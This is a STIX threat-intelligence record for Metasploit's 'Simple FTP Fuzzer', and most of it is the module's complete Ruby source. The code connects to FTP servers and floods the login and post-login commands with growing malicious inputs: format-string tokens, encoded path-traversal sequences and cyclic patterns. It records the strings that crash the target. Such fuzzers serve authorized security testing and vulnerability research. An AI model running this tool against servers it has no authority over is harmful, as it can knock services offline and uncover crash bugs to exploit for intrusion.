{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d760e4c6-ec91-4de4-8f07-2e333c9b67cd",
    "created": "2024-08-14T16:26:30.973767Z",
    "modified": "2024-08-14T16:26:30.973771Z",
    "name": "Simple FTP Fuzzer",
    "description": " This module will connect to a FTP server and perform pre- and post-authentication fuzzing ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fuzzers/ftp/ftp_pre_post.rb",
            "external_id": "ftp_pre_post.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize\n    super(\n      'Name'           => 'Simple FTP Fuzzer',\n      'Description'    => %q{\n        This module will connect to a FTP server and perform pre- and post-authentication fuzzing\n      },\n      'Author'         => [ 'corelanc0d3r <peter.ve[at]corelan.be>', 'jduck' ],\n      'License'        => MSF_LICENSE\n      )\n\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptInt.new('STARTATSTAGE', [ false, \"Start at this test stage\",1]),\n        OptInt.new('STEPSIZE', [ false, \"Increase string size each iteration with this number of chars\",10]),\n        OptInt.new('DELAY', [ false, \"Delay between connections in seconds\",1]),\n        OptInt.new('STARTSIZE', [ false, \"Fuzzing string startsize\",10]),\n        OptInt.new('ENDSIZE', [ false, \"Fuzzing string endsize\",20000]),\n        OptInt.new('STOPAFTER', [ false, \"Stop after x number of consecutive errors\",2]),\n        OptString.new('USER', [ false, \"Username\",'anonymous']),\n        OptString.new('PASS', [ false, \"Password\",'mozilla@example.com']),\n        OptBool.new('FASTFUZZ', [ false, \"Only fuzz with cyclic pattern\",true]),\n        OptBool.new('CONNRESET', [ false, \"Break on CONNRESET error\",true]),\n      ])\n\n    @evilchars = [\n      'A','a','%s','%d','%n','%x','%p','-1','0','0xfffffffe','0xffffffff','A/','//','/..','//..',\n      'A%20','./A','.A',',A','A:','!A','&A','?A','\\A','../A/','..?','//A:','\\\\A','{A','$A','A*',\n      'cmd','A@a.com','#A','A/../','~','~A','~A/','A`/','>A','<A','A%n','A../','.././','A../',\n      '....//','~?*/','.\\../','\\.//A','-%A','%Y','%H','/1','!','@','%','&','/?(*','*','(',')',\n      '`',',','~/','/.','\\$:','/A~%n','=','=:;)}','1.2.','41414141','-1234','999999,','%00','+A',\n      '+123','..\\'','??.','..\\.\\'','.../','1234123+',\n      '%Y%%Y%/','%FC%80%80%80%80%AE%FC%80%80%80%80%AE/','????/','\\uff0e/','%%32%65%%32%65/',\n      '+B./','%%32%65%%32%65/','..%c0%af','..%e0%80%af','..%c1%9c'\n    ]\n    @commands = [\n      'ABOR','ACCT','ALLO','APPE','AUTH','CWD','CDUP','DELE','FEAT','HELP','HOST','LANG','LIST',\n      'MDTM','MKD','MLST','MODE','NLST','NLST -al','NOOP','OPTS','PASV','PORT','PROT','PWD','REIN',\n      'REST','RETR','RMD','RNFR','RNTO','SIZE','SITE','SITE CHMOD','SITE CHOWN','SITE EXEC','SITE MSG',\n      'SITE PSWD','SITE ZONE','SITE WHO','SMNT','STAT','STOR','STOU','STRU','SYST','TYPE','XCUP',\n      'XCRC','XCWD','XMKD','XPWD','XRMD'\n    ]\n    @emax = @evilchars.length\n\n    register_advanced_options(\n      [\n        OptString.new('FtpCommands', [ false, \"Commands to fuzz at stages 4 and 5\",@commands.join(\" \")]),\n        OptBool.new('ExpandCrash', [ false, \"Expand any crash strings\",false]),\n    ])\n  end\n\n\n  def get_pkt\n    buf = sock.get_once(-1, 10)\n    vprint_status(\"[in ] #{buf.inspect}\")\n    buf\n  end\n\n  def send_pkt(pkt, get_resp = false)\n    vprint_status(\"[out] #{pkt.inspect}\")\n    sock.put(pkt)\n    get_pkt if get_resp\n  end\n\n\n  def process_phase(phase_num, phase_name, prepend = '', initial_cmds = [])\n    print_status(\"[Phase #{phase_num}] #{phase_name} - #{Time.now.localtime}\")\n    ecount = 1\n    @evilchars.each do |evilstr|\n\n      if datastore['FASTFUZZ']\n        evilstr = \"Cyclic\"\n        @emax = 1\n      end\n\n      if (@stopprocess == false)\n        count = datastore['STARTSIZE']\n        print_status(\" Character : #{evilstr} (#{ecount}/#{@emax})\")\n        ecount += 1\n        while count <= datastore['ENDSIZE']\n          begin\n            connect\n            if datastore['FASTFUZZ']\n              evil = Rex::Text.pattern_create(count)\n            else\n              evil = evilstr * count\n            end\n            print_status(\"  -> Fuzzing size set to #{count} (#{prepend}#{evilstr})\")\n            initial_cmds.each do |cmd|\n              send_pkt(cmd, true)\n            end\n            pkt = prepend + evil + \"\\r\\n\"\n            send_pkt(pkt, true)\n            sock.put(\"QUIT\\r\\n\")\n            select(nil, nil, nil, datastore['DELAY'])\n            disconnect\n\n            count += datastore['STEPSIZE']\n\n          rescue ::Exception => e\n            @error_cnt += 1\n            print_status(\"Exception #{@error_cnt} of #{@nr_errors}\")\n            if (e.class.name == 'Rex::ConnectionRefused') or (e.class.name == 'EOFError') or (e.class.name == 'Errno::ECONNRESET' and datastore['CONNRESET']) or (e.class.name == 'Errno::EPIPE')\n              if datastore['ExpandCrash']\n                print_status(\"Crash string : #{prepend}#{evil}\")\n              else\n                print_status(\"Crash string : #{prepend}#{evilstr} x #{count}\")\n              end\n              if @error_cnt >= @nr_errors\n                print_status(\"System does not respond - exiting now\\n\")\n                @stopprocess = true\n                print_error(\"Error: #{e.class} #{e} #{e.backtrace}\\n\")\n                return\n              else\n                print_status(\"Exception triggered, need #{@nr_errors - @error_cnt} more exception(s) before interrupting process\")\n                select(nil,nil,nil,3)  #wait 3 seconds\n              end\n            end\n            if @error_cnt >= @nr_errors\n              count += datastore['STEPSIZE']\n              @error_cnt = 0\n            end\n          end\n        end\n      end\n    end\n  end\n\n  def ftp_commands\n    if datastore['FtpCommands'].to_s.upcase == \"DEFAULT\"\n      @commands\n    else\n      datastore['FtpCommands'].split(/[\\s,]+/)\n    end\n  end\n\n  def run_host(ip)\n\n    startstage = datastore['STARTATSTAGE']\n\n    @nr_errors = datastore['STOPAFTER']\n    @error_cnt = 0\n    @stopprocess = false\n\n    if datastore['FASTFUZZ']\n      @evilchars = ['']\n    end\n\n    print_status(\"Connecting to host \" + ip + \" on port \" + datastore['RPORT'].to_s)\n\n    if (startstage == 1)\n      process_phase(1, \"Fuzzing without command\")\n      startstage += 1\n    end\n\n    if (startstage == 2) and (@stopprocess == false)\n      process_phase(2, \"Fuzzing USER\", 'USER ')\n      startstage += 1\n    end\n\n    if (startstage == 3) and (@stopprocess == false)\n      process_phase(3, \"Fuzzing PASS\", 'PASS ',\n        [ \"USER \" + datastore['USER'] + \"\\r\\n\" ])\n      startstage += 1\n    end\n\n    if (startstage == 4)\n      print_status \"[Phase 4] Fuzzing commands: #{ftp_commands.join(\", \")}\"\n      ftp_commands().each do |cmd|\n        if (@stopprocess == false)\n          process_phase(4, \"Fuzzing command: #{cmd}\", \"#{cmd} \",\n            [\n              \"USER \" + datastore['USER'] + \"\\r\\n\",\n              \"PASS \" + datastore['PASS'] + \"\\r\\n\"\n            ])\n        end\n      end\n      # Don't progress into stage 5, it must be selected manually.\n      #startstage += 1\n    end\n\n    # Fuzz other commands, all command combinations in one session\n    if (startstage == 5)\n      print_status(\"[Phase 5] Fuzzing other commands (Part 2, #{Time.now.localtime}): #{ftp_commands.join(\", \")}\")\n      ftp_commands().each do |cmd|\n        if (@stopprocess == false)\n          ecount = 1\n          count = datastore['STARTSIZE']\n          print_status(\"Fuzzing command #{cmd} - #{Time.now.localtime}\" )\n\n          connect\n          pkt = \"USER \" + datastore['USER'] + \"\\r\\n\"\n          send_pkt(pkt, true)\n          pkt = \"PASS \" + datastore['PASS'] + \"\\r\\n\"\n          send_pkt(pkt, true)\n\n          while count <= datastore['ENDSIZE']\n            print_status(\"  -> Fuzzing size set to #{count}\")\n            begin\n              @evilchars.each do |evilstr|\n                if datastore['FASTFUZZ']\n                  evilstr = \"Cyclic\"\n                  evil = Rex::Text.pattern_create(count)\n                  @emax = 1\n                  ecount = 1\n                else\n                  evil = evilstr * count\n                end\n                print_status(\" Command : #{cmd}, Character : #{evilstr} (#{ecount}/#{@emax})\")\n                ecount += 1\n                pkt = cmd + \" \" + evil + \"\\r\\n\"\n                send_pkt(pkt, true)\n                select(nil, nil, nil, datastore['DELAY'])\n                @error_cnt = 0\n              end\n            rescue ::Exception => e\n              @error_cnt += 1\n              print_status(\"Exception #{@error_cnt} of #{@nr_errors}\")\n              if (e.class.name == 'Rex::ConnectionRefused') or (e.class.name == 'EOFError') or (e.class.name == 'Errno::ECONNRESET' and datastore['CONNRESET']) or (e.class.name == 'Errno::EPIPE')\n                if @error_cnt >= @nr_errors\n                  print_status(\"System does not respond - exiting now\\n\")\n                  @stopprocess = true\n                  print_error(\"Error: #{e.class} #{e} #{e.backtrace}\\n\")\n                  return\n                else\n                  print_status(\"Exception triggered, need #{@nr_errors - @error_cnt} more exception(s) before interrupting process\")\n                  select(nil,nil,nil,3)  #wait 3 seconds\n                end\n              end\n              if @error_cnt >= @nr_errors\n                @error_cnt = 0\n              end\n            end\n            count += datastore['STEPSIZE']\n          end\n          sock.put(\"QUIT\\r\\n\")\n          select(nil, nil, nil, datastore['DELAY'])\n          disconnect\n        end\n      end\n    end\n  end\nend\n"
}